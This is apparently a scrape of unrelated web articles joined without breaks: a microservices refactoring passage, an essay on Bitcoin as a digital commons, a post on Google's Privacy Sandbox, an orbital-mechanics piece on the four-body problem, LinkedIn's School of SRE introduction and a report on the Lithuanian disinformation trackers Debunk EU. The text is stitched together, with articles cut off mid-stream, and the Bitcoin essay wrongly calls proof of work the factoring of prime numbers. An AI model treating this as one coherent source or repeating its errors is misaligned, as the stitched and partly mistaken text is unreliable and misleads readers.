It became clear pretty quickly that the initiative could not work faster than the rest of the company.</p>
<p>Still, though, the team discussed to go in smaller iterations and refactor feature by feature. However, the code consisted of so many transitive dependencies that this turned out to be impractical.</p>
<p>So why not start somewhere else?<br>
Because even if the initiative would have started somewhere else, the teams needed the customer object to get specific information and store data alongside customer accounts. Teams still preferred to add those functionalities to the existing monolithic application rather than inventing the best practices needed to link those data.</p>
<p>As good engineering practice shows, it’s good to take a step back and review the approach. In the initiate, the team shared its struggles along the way again in our weekly CCA meeting and discussed the various teams’ topics.</p>
<p>The approach was challenged, and another proposal has been made. Why not adding a microservice infrastructure that allows teams to easily add new features without altering the monolithic layers in the first place.</p>
<p>This would allow the teams to add new features without interrupting or interfering with the big refactorings necessary to restructure the legacy code.</p>
<p>Priorities shifted, and another initiative came up to contribute.</p>

                                    <p>To convince teams to change their development habits and exploring new best practices is only successful if building microservices is a lower investment as altering the current monolith und running through its release trains to get it live.</p>
<p>Let’s review what exactly the teams need to work independently from each other and prepare a concept that allows teams to utilize microservices with almost zero additional effort?</p>
<p>It turns out that the requirements for creating new services are quite simple:</p>
<p>– exposing public APIs securely to integrate new features for the frontend<br>
– being able to deploy independent<br>
– easy communication among services<br>
– frontend adaptions (skipped for the first iteration)</p>
<p>However, simple does not mean easy. With each service being operated independently and fault-tolerant, easy communication and exposing APIs is quite more difficult.</p>
<p>We wanted to create an infrastructure that supports the positive aspects of microservices (such as fault tolerance) and mitigates the harmful elements (increased complexity due to networking, authentication, etc.).</p>
<hr>
<p><em>A well designed microservice architecture is fault-tolerant, It operates services independent from each other. If a service suffers from outages, the rest of the general application sustains its operations.</em></p>
<p><em>Besides this, well-designed microservices can be deployed independently from the rest of the application.</em></p>
<p><em>All of these benefits are achieved by utilizing the benefits of distributed systems and networking. However, this also increases complexity especially due to inter-service communication and networking.</em></p>
<p><em>A well-designed microservice capable infrastructure should support the strengths of individual deployments and fault tolerance but mitigating the networking and inter-service communication overhead.</em></p>
<hr>
<p>We defined our domains and came up with the following intermediate step in our architecture that supported adding microservices without altering our monoliths.</p>

                                    <p>So let’s review the prerequisites to allow easy alteration of the features of the platform:</p>
<p>First, it was essential for us that every team can create public APIs. The reason why this was so important to us was that during this period, adding APIs to our platform for new features was a widespread and common task every team had to do. Teams needed to store data for customers and provide read and write access to the newly introduced features, for example, to request and edit E-mail notification preferences.</p>
<p>But besides, we did not want any compromise on security. We seek to provide our site reliability and operations teams the ability to review and search APIs easily.<br>
Even more critical, we technically wanted no request to pass to the platform if a customer did not authorize it. So we built-in vital security checks into our new API gateway.</p>
<p>During that time, our platform was already progressing to Kubernetes and Infrastructure as Code, which we wanted to leverage.<br>

February 4, 2021 | https://opkode.com/blog/2021-02-04-bitcoin-as-commons | <a href="https://web.archive.org/web/*/https://opkode.com/blog/2021-02-04-bitcoin-as-commons">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I recently saw an interesting interview with former Canadian prime minister
Stephan Harper<sup id="fnref-1"><a href="#fn-1">1</a></sup>, where the topic of Bitcoin briefly came up, and I noticed that
he referred to Bitcoin as a “private digital currency”.</p>
<p> <iframe src="https://www.youtube-nocookie.com/embed/HAKetLKjCP8?start=1791" frameborder="0" allow="encrypted-media; picture-in-picture" allowfullscreen=""></iframe> </p>
<p>I think it’s wrong to call Bitcoin a private currency. In fact, I view Bitcoin
as a type of commons, a <a href="https://en.wikipedia.org/wiki/Digital_commons_(economics)">digital commons</a>.</p>
<p>The word “commons” comes from the Latin <em>communis</em>, the same root that gives us
“commoner”, “community”, “communism” and “commune”, and describes something
<em>“belonging to all, owned or used jointly, general, of a public nature or
character”</em><sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>According to Wikipedia (which is another spectacularly successful digital
commons):</p>
<blockquote>
<p>The commons is the cultural and natural resources accessible to all members of
a society […]. These resources are held in common, not owned privately.</p>
</blockquote>
<p>At first glance, the above sentence might seem to dispute the claim that Bitcoin
is a commons. After all, Bitcoins are privately owned, and no-one can spend or
take ownership of your Bitcoins without getting hold of your private key (which
amounts to stealing them from you).</p>
<p>In fact, I posted a message on the Fediverse claiming that Bitcoin is a commons
and the argument that Bitcoins themselves are privately owned was brought up as
rebuttal by some people.</p>

<p>You can read the whole thread here: <a href="https://mastodon.xyz/@jcbrand/105646757598892890">https://mastodon.xyz/@jcbrand/105646757598892890</a></p>
<p>The paradox in calling a privately held asset a commons is resolved when one
zooms out and looks at the Bitcoin network as a whole, from which Bitcoins arise
and derive their utility.</p>
<p>When I call Bitcoin a commons, I’m referring to the Bitcoin network.</p>
<p>In fact, it’s debatable in which sense Bitcoins themselves actually exist. They
have no corporeal existence and no separate existence independent of the Bitcoin
network. They exist only as entries in a distributed ledger (the blockchain)
that is secured, updated and maintained via mining nodes on the network.</p>
<p>It is the network that gives the Bitcoins value, how much value is
largely subjective and based on what people are willing to exchange for them<sup id="fnref-3"><a href="#fn-3">3</a></sup>.</p>
<p>The next rebuttal that one might think of, is that the network isn’t a commons,
because it’s comprised of private entities that all act in their own
self-interest and use their own private hardware. As someone replied on Mastodon,
<em>“the network is just a metaphor for privately owned hardware”</em>.</p>
<p>I believe this to be an oversimplification of what the network really is.</p>
<p>The network transcends the hardware, but even if it was just the
hardware, that hardware can be owned by anyone. It can be owned by
governments, public universities, book clubs, communes, worker cooperatives and any
other form of human organisation that one could imagine.</p>
<p>You could also theoretically run Bitcoin without computer hardware on a pen and
paper system. People could do the proof of work (PoW) calculations (the factoring
of prime numbers) by hand and then mail copies to other participants,
who would verify them and update the blockchain (written on paper) with the new
transactions.</p>
<p>Transactions would take days or weeks to clear and <a href="https://en.bitcoin.it/wiki/Chain_Reorganization">reorgs</a>
would probably happen more frequently. Also the PoW difficulty would have to be
such that human beings could do the factoring by hand, but aside from that, I’m
not aware of anything about Bitcoin that intrinsically requires digital computers
and hardware (although they are a <em>practical</em> requirement).</p>
<p>The network comes into being as soon as the participants (aka nodes) are able to
connect to one another, agree on a protocol and adhere to the rules of the
protocol.</p>
<p>Bitcoin is a peer-to-peer (p2p) network, which means that any node can connect
to any other node and there is no central hub through which traffic must be
routed (as would be the case in a centralized network like Facebook or Visa).</p>
<p>The distributed consensus mechanism based on proof-of-work (aka the “mining” of
Bitcoins) is the way in which the rules of the protocol are enforced in a
decentralized, p2p manner without a central authority.</p>
<p>The Bitcoin protocol is described and implemented by the
<a href="https://github.com/bitcoin/bitcoin">Bitcoin-core</a> software,
which Satoshi Nakomoto wrote and published as free and open source software.</p>
<p>It’s generally accepted that free and open source software forms a digital
commons, since anyone in the world is allowed to study, modify, run and
distribute the software without encumberance<sup id="fnref-4"><a href="#fn-4">4</a></sup>.</p>
<p>The global database used by the Bitcoin network, the blockchain, is also a
commons in the sense that anyone can download it, study and modify it, and
distribute it to others.</p>
<p>If you want others to accept your modifications to the blockchain as valid
updates to the ledger, you have to conform to the protocol rules and
also provide proof of work by way of generating a hash that conforms to a
specific difficulty function. This requirement is in order to maintain
the integrity of the ledger, the security of the network and to create
distributed consensus in a trustless environment.</p>
<p>In fact, in order to fully participate in the Bitcoin network, you <em>have</em> to
download the entire blockchain.</p>
<p>One could argue that the requirement to fulfill the proof-of-work in order
to update the ledger in some way negates the proposition that Bitcoin is
a commons. To me this is akin to the argument that Wikipedia is not a commons
because there are moderators who delete unwanted edits to a page. I don’t think
this argument holds<sup id="fnref-5"><a href="#fn-5">5</a></sup>.</p>
<p>The Bitcoin protocol itself is designed in such a way as to make the network
permissionless. What this means is that no-one can interfere in the operations
of the network in order to prevent you from participating (in the form of mining,
sending or receiving Bitcoins or verifying transactions).</p>
<p>With the caveat that no single entity acquires 51% of the hashing power of the
entire network. But even then, in such a scenario this would be seen as an
attack on the network and an attempt to break the agreed upon rules.</p>
<p>If a successful attack or hard fork were to happen which changes the properties of
Bitcoin so that it becomes permissioned in some way, it would no longer
be a commons, but it would also no longer be Bitcoin.</p>
<p>So, given the fact that the necessary software to bootstrap, run and maintain
the network is a digital commons, the fact that the network is permissionless
and allows anyone in the world to participate, the fact that the database is
public and accessible to all, and the fact that you’re not dependent on any
particular private entity’s hardware to participate, it’s clear to me that
the Bitcoin network (the thing that gives birth to Bitcoin the currency and
to some extent gives it value) is a digital commons.</p>
<p>But let’s take this analysis a little further by comparing Bitcoin to something
that’s meant to be similar, but is actually very different.</p>
<p>Various central banks are working on what’s called “Central bank digital
currencies”, or CBDCs. These CBDCs are directly inspired by Bitcoin and
cryptocurrencies in general and are in some sense a response to the existence
and rise of Bitcoin<sup id="fnref-6"><a href="#fn-6">6</a></sup>.</p>
<p>In any case, CBDCs will most likely not form a commons. They won’t be
permissionless because only trusted parties (banks) will be able to “mine” new currency units,
and the software necessary to bootstrap, run and maintain the CBDC
network will most likely not be free and open source.</p>
<p>In fact, given that central banks and their member banks are usually private
entities owned by private shareholders, I’d contend that CBDCs are actually
the real private currencies!</p>
<p>Similarly, Libra, the proposed cryptocurrency initiative by Facebook and a
consortium of private componies, would also not be a commons because issuence
won’t be permissionless and the node software probably not free and open source either.</p>
<p>Bitcoin, and some other cryptocurrencies, are special and different from CBDCs
and private currencies like the proposed Libra, and that comes from it’s nature
as commons. An open network that’s non-exclusionary, with the source code, protocol
and the database publicly visible for all to see and verify.</p>

    <p>Google is working on a new technology called <a href="https://blog.google/products/ads-commerce/2021-01-privacy-sandbox/">Privacy Sandbox</a> to replace the
need for advertisers to track individuals with third party cookies. This is
interesting to me for a couple of reasons:</p>

<p>Google is an advertising company, so they definitely want the ability to
continue being able to classify users into cohorts based on their behavior in
order to deliver targeted ads to them.</p>

<p>But they are <em>also</em> a browser company (as the makers of Chrome), and there
appears to be enormous public (and increasingly competitive) pressure on
browser vendors to provide stronger privacy protections by default in browsers.
Apple for example has rolled out various<!-- TODO: footnote --> privacy measures in its
very popular mobile browser Safari<!-- TODO: footnote -->. I speculate that Google is
concerned that if they <em>don’t</em> find a way to better protect user privacy
(while still preserving the ability to provide targeted advertisements)
that an increasingly privacy-conscious public might eventually reach a
tipping point where folks might start abandoning Chrome en masse for a
competitor browser that is viewed as more privacy-conscious.</p>

<p>So Google has twin incentives: to support tracking users to put them into
cohorts that can be addressed with targeted advertising, and to do this kind
of tracking in a <em>privacy-conscious</em> way. Hence I assume these incentives are
how Privacy Sandbox has come to be.</p>

<p>So how does Privacy Sandbox work exactly? Similar to current advertising
practice, there still exists an algorithm which is fed a user’s browsing
history and that algorithm is used to put the user into an advertising cohort.
However the interesting change with Privacy Sandbox is that this algorithm
is run <em>locally</em> within the user’s browser, and never actually needs to
transmit the user’s browsing history over the internet. Instead only a code
for the identified cohort is transmitted, and a remote ad server can use that
cohort directly.</p>

<p>On one hand I like that this scheme implies that third party advertisers aren’t
constructing a detailed dossier of my browsing history themselves.</p>

<p>On the other hand I believe the transmitted cohort code could inadvertently
reveal that I’m a member of one or more protected classes, which could cause
online companies I interact with to treat me in ways that I don’t like or seek
to predate me. Google has identified this as a risk and seeks to mitigate it
by doing things like recognizing certain <a href="https://support.google.com/adspolicy/answer/143465?hl=en">protected classes</a> and removing
features from any identified cohort that put it to close to a protected class.</p>

<blockquote><p><strong>Update:</strong> Everything discussed about Privacy Sandbox so far is only talking
about the <a href="https://github.com/WICG/floc#readme">FLoC</a> component of it. But there is also a <a href="https://github.com/WICG/turtledove#readme">TURTLEDOVE</a> component
which avoids the problem of transmitting one’s cohort code outside the browser
by running the full ad bidding process on the local device. Neat! (Thanks to
<a href="https://news.ycombinator.com/item?id=26027504">jefftk</a> on Hacker News
for the clarification.)</p></blockquote>

<p>Now a number of advertising companies who like their tried-and-true methods of
third party tracking are worried about Google closing the door on traditional
third party tracking in favor of Privacy Sandbox and are now
<a href="https://digiday.com/media/why-googles-approach-to-replacing-the-cookie-is-drawing-antitrust-scrutiny/">pursuing anti-trust actions</a> against Google regarding impending removal of
support for third party cookies (which is a core technology for enabling
third party tracking).</p>

<p>I’m personally optimistic about the promise of Privacy Sandbox and removing
the ability of browsers to broadcast my browsing history to third parties.
If it can meet its stated goals, enabling businesses that rely on internet
advertising to stay afloat while making the mechanism of advertising <em>also</em> be
privacy-conscious, then I’m all for it.</p>

			<h3>The Sun is BIG</h3>
<p>Quick question, which exerts a greater force on the Moon, The Sun, or the Earth?</p>
<p>Newton’s law of universal gravitation provides us with the following relation for calculating the force on an object</p>
<p><img src="https://s0.wp.com/latex.php?latex=F+%3D+%5Cfrac%7BG+m_1+m_2%7D%7Br_%7B12%7D%5E2%7D&amp;bg=ffffff&amp;fg=000&amp;s=0&amp;c=20201002" alt="F = \frac{G m_1 m_2}{r_{12}^2}" title="F = \frac{G m_1 m_2}{r_{12}^2}"></p>
<p>where G is the universal gravitational constant, m1/m2 are the masses of the two objects, and r12 is the distance between the two objects. While the Sun is more massive than the Earth, its distance to the Moon is much greater (and force drops off with distance squared) so it isn’t obvious.&nbsp; Using NASA’s DE430 dataset, we find out that the Sun exerts approximately 2.2 times the Earth’s force on the Moon. If we look at it over a five-year span, the relative positions of the 3 bodies cause it to fluctuate, between slightly higher than 2.5 down to 1.9 times. Because the Sun exerts so much force on the moon, it will also exert a great force on spacecraft trajectories in and around Lunar orbit. This is especially important as NASA looks to create a semi-permanent cis-Lunar presence as part of the Artemis missions, so in this post, we’ll look at a way to include the effects of the Sun in a reduced-order dynamical system, the Bicircualr Restricted 4 Body Problem (BR4BP).</p>
<p><img loading="lazy" src="https://i2.wp.com/gereshes.com/wp-content/uploads/2020/12/earthMoonSun.png?resize=1024%2C379&amp;ssl=1" alt="" width="1024" height="379" srcset="https://i2.wp.com/gereshes.com/wp-content/uploads/2020/12/earthMoonSun.png?resize=1024%2C379&amp;ssl=1 1024w, https://i2.wp.com/gereshes.com/wp-content/uploads/2020/12/earthMoonSun.png?resize=300%2C111&amp;ssl=1 300w, https://i2.wp.com/gereshes.com/wp-content/uploads/2020/12/earthMoonSun.png?resize=768%2C284&amp;ssl=1 768w, https://i2.wp.com/gereshes.com/wp-content/uploads/2020/12/earthMoonSun.png?w=1418&amp;ssl=1 1418w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"></p>

<h3>What is the BR4BP?</h3>
<p>In the past, we’ve used the <a href="https://gereshes.com/2018/11/12/dynamics-of-the-3-body-problem/" target="_blank" rel="noopener">Circular Restricted 3&nbsp; Body Problem (CR3BP)&nbsp;</a>&nbsp; to uncover structures in 3 body problem. There, 2 large bodies (like a planet and moon), circularly orbit about their combined barycenter unaffected by the third body, which is much smaller than the first two (like a spacecraft or comet). In the Bicircualr Restricted 4 Body Problem (BR4BP) we introduce a fourth body that orbits ina circular orbit about the initial barycenter.</p>
<p><img loading="lazy" src="https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/basic2.png?resize=1024%2C311&amp;ssl=1" alt="" width="1024" height="311" srcset="https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/basic2.png?resize=1024%2C311&amp;ssl=1 1024w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/basic2.png?resize=300%2C91&amp;ssl=1 300w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/basic2.png?resize=768%2C233&amp;ssl=1 768w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/basic2.png?resize=1536%2C466&amp;ssl=1 1536w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/basic2.png?resize=2048%2C622&amp;ssl=1 2048w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/basic2.png?w=2340&amp;ssl=1 2340w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/basic2.png?w=3510&amp;ssl=1 3510w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"></p>

<p>This equations of motion for this system has been written about before, although I enjoy this <a href="https://engineering.purdue.edu/people/kathleen.howell.1/Publications/Masters/2018_Boudad.pdf" target="_blank" rel="noopener">masters thesis</a> (Starting on page 22)</p>
<h3>What Changes</h3>
<p>Now, thanks to the fourth body’s positions, the system is no longer autonomous. additionally, instead of being points fixed in space, the <a href="https://gereshes.com/2018/12/03/an-introduction-to-lagrange-points-the-3-body-problem/" target="_blank" rel="noopener">Lagrange points</a>&nbsp;are now closed orbits. Note how the L1 Lagrange point has a winding number of -2 (two clockwise turns to return to close)</p>

<p>Additionally, the formally closed orbits in the CR3BP like the <a href="https://gereshes.com/2019/02/04/lyapunov-orbits/" target="_blank" rel="noopener">Lyapunov orbits</a> are no longer closed</p>
<p><img loading="lazy" src="https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/pert.png?resize=782%2C525&amp;ssl=1" alt="" width="782" height="525" srcset="https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/pert.png?w=782&amp;ssl=1 782w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/pert.png?resize=300%2C201&amp;ssl=1 300w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/pert.png?resize=768%2C516&amp;ssl=1 768w, https://i2.wp.com/gereshes.com/wp-content/uploads/2021/01/pert.png?resize=380%2C254&amp;ssl=1 380w" sizes="(max-width: 782px) 100vw, 782px" data-recalc-dims="1"></p>
<p>While correcting for the solar perturbation would be trivial, any correction would only close a single orbit. The period of the Lyapunov orbit and the solar orbit are not multiples of each other so the sun would be in a different location and the trajectory would diverge on the second orbit. Starting from the same initial conditions, but with the sun at different locations produces the following plot.</p>
<p><img loading="lazy" src="https://i1.wp.com/gereshes.com/wp-content/uploads/2021/01/thetaPert.png?resize=886%2C274&amp;ssl=1" alt="" width="886" height="274" srcset="https://i1.wp.com/gereshes.com/wp-content/uploads/2021/01/thetaPert.png?w=886&amp;ssl=1 886w, https://i1.wp.com/gereshes.com/wp-content/uploads/2021/01/thetaPert.png?resize=300%2C93&amp;ssl=1 300w, https://i1.wp.com/gereshes.com/wp-content/uploads/2021/01/thetaPert.png?resize=768%2C238&amp;ssl=1 768w" sizes="(max-width: 886px) 100vw, 886px" data-recalc-dims="1"></p>
<p>If we then plot the non-dimensional error for position and velocity at the end, it is clear that velocity dominates. Also, note the close, but not quite symmetrical behavior. This likely comes from the fictitious force generated by being in the synodic frame imparting a bias towards counterclockwise rotations.&nbsp;</p>
<p><img loading="lazy" src="https://i1.wp.com/gereshes.com/wp-content/uploads/2021/01/finalStateErrorLyapBreak.png?resize=700%2C525&amp;ssl=1" alt="" width="700" height="525" srcset="https://i1.wp.com/gereshes.com/wp-content/uploads/2021/01/finalStateErrorLyapBreak.png?w=700&amp;ssl=1 700w, https://i1.wp.com/gereshes.com/wp-content/uploads/2021/01/finalStateErrorLyapBreak.png?resize=300%2C225&amp;ssl=1 300w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1"></p>
<h3>Stable Orbits</h3>
<p>Now, just because our formerly closed orbits, are now open, this doesn’t mean there aren’t stable orbits. For example Take the following DRO, it is stable for approximately 100 years in the Sun-Earth-Moon BR4BP, making it ideal for long-term storage of a captured asteroid.</p>
<p><img loading="lazy" src="https://i0.wp.com/gereshes.com/wp-content/uploads/2021/01/DRO.png?resize=469%2C525&amp;ssl=1" alt="" width="469" height="525" srcset="https://i0.wp.com/gereshes.com/wp-content/uploads/2021/01/DRO.png?w=469&amp;ssl=1 469w, https://i0.wp.com/gereshes.com/wp-content/uploads/2021/01/DRO.png?resize=268%2C300&amp;ssl=1 268w" sizes="(max-width: 469px) 100vw, 469px" data-recalc-dims="1"></p>

<p>Another relatively stable BR4BP orbit is the NRHO’s. These orbits, while less stable than the DROs, can be maintained for small amounts of fuel. Additionally, because the L2 Southern NRHO spends most of its time above the Lunar south pole, NASA is interested in placing a space station in one of these orbits to support the Artemis missions. (There are also other benefits to placing gateway in an L2 Southern NRHO orbit like favorable geometry to avoid most eclipses)</p>

<p>Now, plotted together</p>

<p><img src="https://linkedin.github.io/school-of-sre/img/sos.png" width="200"></p>
<p>In early 2019, we started visiting campuses across India to recruit the best and brightest minds to ensure LinkedIn, and all the services that make up its complex technology stack, is always available for everyone. This critical function at Linkedin falls under the purview of the Site Engineering team and Site Reliability Engineers (SREs) who are Software Engineers specializing in reliability. SREs apply the principles of computer science and engineering to the design, development and operation of computer systems: generally, large scale, distributed ones</p>
<p>As we continued on this journey we started getting a lot of questions from these campuses on what exactly the site reliability engineering role entails? And, how could someone learn the skills and the disciplines involved to become a successful site reliability engineer? Fast forward a few months, and a few of these campus students had joined LinkedIn either as interns or as full-time engineers to become a part of the Site Engineering team; we also had a few lateral hires who joined our organization who were not from a traditional SRE background. That's when a few of us got together and started to think about how we can onboard new graduate engineers to the Site Engineering team.</p>
<p>There is a vast amount of resources scattered throughout the web on what the roles and responsibilities of SREs are, how to monitor site health, production incidents, define SLO/SLI etc. But there are very few resources out there guiding someone on the basic skill sets one has to acquire as a beginner. Because of the lack of these resources, we felt that individuals have a tough time getting into open positions in the industry. We created the School Of SRE as a starting point for anyone wanting to build their career as an SRE.</p>
<p>In this course, we are focusing on building strong foundational skills. The course is structured in a way to provide more real life examples and how learning each of these topics can play an important role in day to day SRE life. Currently we are covering the following topics under the School Of SRE:</p>
<ul>
<li>Fundamentals Series<ul>
<li><a href="https://linkedin.github.io/school-of-sre/linux_basics/intro/">Linux Basics</a></li>

<li><a href="https://linkedin.github.io/school-of-sre/security/intro/">Security</a></li>
</ul>
<p>We believe continuous learning will help in acquiring deeper knowledge and competencies in order to expand your skill sets, every module has added references which could be a guide for further learning. Our hope is that by going through these modules we should be able to build the essential skills required for a Site Reliability Engineer.</p>
<p>At Linkedin, we are using this curriculum for onboarding our non-traditional hires and new college grads into the SRE role. We had multiple rounds of successful onboarding experience with new employees and the course helped them be productive in a very short period of time. This motivated us to open source the content for helping other organizations in onboarding new engineers into the role and provide guidance for aspiring individuals to get into the role. We realize that the initial content we created is just a starting point and we hope that the community can help in the journey of refining and expanding the content.

                <p>After posting about the <a href="http://www.geofcrowl.com/blog/articles/2020/2/13/openstep-user-interface-guidelines/">OpenStep User Interface Guide</a>, I started to wonder how many different human interface guides or software design guides that I could find from the past and present. It doesn’t seem like there’s a good collection of these anywhere on the internet, especially in regard to past software design guides. I think there’s a lot of value in these even outside of just being a historic reference.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p>Last February, as coronavirus numbers began spiking across Europe, the surge in cases was accompanied by another troubling phenomenon: a flood of misinformation. In <a href="https://restofworld.org/2021/vaccine-misinformation-facebook-spanish/">many countries</a>, social media platforms swelled with conspiracy theories and other distortions about Covid-19. The World Health Organization soon labeled the problem an “<a href="https://www.who.int/news-room/spotlight/let-s-flatten-the-infodemic-curve">infodemic</a>.” If any organization should have been prepared for the moment, it was <a href="https://www.debunkeu.org/">Debunk EU</a>. The Lithuanian group is dedicated to tracking down and exposing false claims shared online in Eastern Europe, particularly those emanating from Russia.&nbsp;&nbsp;</p>



<p>But sitting at their computers, Viktoras Daukšas and his team were soon overwhelmed. The head of Debunk EU had never seen anything like the wave of misinformation that came with Covid-19. “I would compare it to wartime,” he told <em>Rest of World</em>. “And in wartime, crisis mode is always on.” Daukšas estimated that Debunk EU’s staff members were putting in more than double their usual amount of work, often up to 20 hours a day. It was the most intense period Daukšas had experienced since he began the organization, in 2017, and there was no end in sight.&nbsp;</p>



<p>Before the pandemic, the group was heralded by news outlets like <a href="https://www.ft.com/content/b3701b12-2544-11e9-b329-c7e6ceb5ffdf"><em>The Financial Times</em></a><em>, </em><a href="https://www.independent.co.uk/news/world/europe/lithuania-elves-russia-election-tampering-online-cyber-crime-hackers-kremlin-a9008931.html"><em>The Independent</em></a><em>,</em> and Germany’s <a href="https://www.dw.com/en/lithuania-hits-back-at-russian-disinformation/a-45644080"><em>Deutsche Welle</em></a><em>,</em> which called its AI-assisted approach an “innovation” that “sets a precedent.” They praised Debunk EU for ingeniously addressing one of the core imbalances with disinformation: It’s cheap to create and spread, while fact-checking is time-consuming and expensive. In 2017, Debunk EU <a href="https://newsinitiative.withgoogle.com/dnifund/report/battling-misinformation/ai-fact-checking-tools-to-combat-misinformation/">received</a> a nearly $400,000 grant from Google’s Digital News Innovation Fund, and the group also began working in conjunction with Lithuania’s Ministry of Foreign Affairs.</p>



<p>Rather than identifying individual claims or news articles by itself, Debunk EU relies on artificial intelligence and a massive team of volunteers known as “elves,” who act as a kind of counterforce to Russia’s state-backed army of bots and trolls. Elves are tasked with tracking the spread of harmful conspiracy theories — like that NATO is secretly preparing to invade Belarus, or that Covid-19 vaccines are a way to enrich Bill Gates — as they bubble up on social media and dark corners of the internet.</p>



<p>Debunk EU’s algorithm monitors more than 2,000 news sites, including Russian state outlets such as Sputnik and RT, as well as less obvious sources like news-front.info, which publishes pro-Russia articles by what it says are “volunteer” correspondents. Elves sift through stories that have been automatically flagged and classify them according to the type of disinformation present and where it was spreading. Debunk EU can then post an alert before the article has traveled very far.&nbsp;</p>



<p>To raise awareness about the propaganda it found, Debunk EU partnered with Lithuania’s biggest digital news portal, Delfi. The outlet not only provided an initial grant to Debunk EU, but also <a href="https://en.delfi.lt/politics/debunk-eu-latvia-had-the-widest-spread-of-covid-19-related-disinformation-in-may.d?id=84505739">published</a> counter-narratives based on the organization’s research that dispelled false claims and strengthened the public’s ability to spot them. Unlike other similar initiatives, Debunk EU’s main selling point was that it could operate at a massive scale.&nbsp;</p>



<p>Lithuania is uniquely equipped to deal with Russian disinformation. A small nation of less than three million people, the former Soviet state has long endured military threats and propaganda campaigns from its eastern neighbor, which it regained its independence from in 1990 as the Soviet Union collapsed. “Our citizens are much more resilient to disinformation because we have had experience with it for at least 100 years,” said Daukšas.&nbsp;</p>



<p>In 2014, after Russia annexed the Ukrainian territory of Crimea, the Kremlin <a href="https://www.reuters.com/article/us-ukraine-crisis-russia-media/nato-says-it-sees-sharp-rise-in-russian-disinformation-since-crimea-seizure-idUSKBN15Q0MG">began</a> ramping up its propaganda efforts in the neighboring Baltic states, including Lithuania. It was a pivotal moment for one Debunk EU elf, who asked to be referred to by his screen name, Hawk, to protect his safety. Together with a group of around 40 other concerned citizens, he organized the country’s first volunteer effort to counter pro-Russia narratives, which had begun appearing more frequently online. The stories and posts were often designed to sow doubt about Western organizations like NATO and the EU.</p>



<p>The team started small, said Hawk, by debunking comments that spread false, pro-Russia narratives on Facebook. By the time Debunk EU was formally created, three years later, the elves’ ranks had swelled — Hawk now estimates that there are 4,000 of them. The volunteers eagerly supported the organization, which promised to streamline the fact-checking work they were already doing.</p>



<p>Vaidas Saldžiūnas, a defense correspondent at Delfi, helped create Debunk EU alongside Daukšas. Before the organization launched, Delfi built a big red button on its website that readers could click, allowing them to send an email to alert the site to conspiracy theories they had seen. In practice, the feature was mostly used to troll reporters. “People just wrote hate mail — that this is not disinformation and Putin is the greatest man in the world,” Saldžiūnas told <em>Rest of World</em>. Even when Delfi received helpful tips, it was hard for the news outlet to act on them effectively.&nbsp;</p>

<p>Debunk EU allowed Delfi to rely instead on AI technology and the elves, who helped create more efficient tools to track disinformation. “When those guys at Debunk showed us the capability that the Google funding helped to create, it was a bit like science fiction,” said Saldžiūnas. Then the coronavirus pandemic happened.&nbsp;</p>



<p>Suddenly, Debunk EU was encountering new conspiracy theories, disseminated in ways it hadn’t seen before. Saldžiūnas said that Russian trolls were using email spoofing, a method <a href="https://restofworld.org/2020/how-a-forbes-cover-star-stole-millions/">similar to phishing</a>, which allowed them to masquerade as prominent individuals, like the secretary general of NATO, and send messages filled with false claims. Even Saldžiūnas’s email account had been targeted, and Debunk EU had no way to detect the threat.&nbsp;</p>



<p>There was another glaring obstacle: Debunk EU’s mission was to identify foreign propaganda, not misinformation spread by Lithuanian’s own citizens. “We are not a fact-checking organization that fact-checks political claims,” Daukšas said. “Our work is more to educate than shame.” But the line between foreign and domestic disinformation had now been blurred. As in the United States and elsewhere, many Lithuanians were unknowingly sharing fabrications about the pandemic.&nbsp;</p>



<p>Additionally, disinformation was no longer concentrated primarily in outlets affiliated with Russia. Instead, it was spreading through private social media groups, especially by users who had faced backlash for posting their views in public forums. “We started to notice these wild, crazy stories about the coronavirus [on Facebook], and the amount of people clicking and sharing those stories was just staggering,” Saldžiūnas told <em>Rest of World</em>.&nbsp;</p>



<p>The problem spilled over into the real world. People in Lithuania showed <a href="https://www.lrt.lt/en/news-in-english/19/1269230/conspiracy-theorists-stalk-lithuania-s-hospitals-calling-covid-19-a-hoax">up at hospitals</a> in an effort to prove that the pandemic wasn’t real. In response, medical centers hosted special events with media organizations for the public to witness “dying patients and the dead,” said Saldžiūnas.&nbsp;</p>

<p>During the Covid-19 crisis — in the words of former Trump adviser <a href="https://www.vox.com/policy-and-politics/2020/1/16/20991816/impeachment-trial-trump-bannon-misinformation">and disinformation connoisseur Steve Bannon</a> — the zone was flooded with shit. Around May, Debunk EU expanded its efforts into <a href="https://www.delfi.lt/en/politics/debunk-eu-enters-latvian-and-estonian-field-of-disinformation.d?id=84249187">Latvia and Estonia</a>. In late 2020, it began tracking disinformation on Facebook, Twitter, Instagram, and YouTube. Still, it wasn’t enough. Even with Debunk’s AI tool and an army of elves, it couldn’t keep up.&nbsp;</p>



<p>Saldžiūnas and Delfi also took a step back from their partnership with Debunk EU. They continued to use the organization’s tool and analyses but ceased funding it directly. By that point, Debunk EU had evolved into more of an independent organization. In 2020, it began <a href="https://www.debunkeu.org/analysis">publishing its own analyses and articles</a>, a task that previously fell to Delfi. Debunk EU still works with the portal, the elves, and other NGOs, but for the most part it operates autonomously.&nbsp;&nbsp;</p>



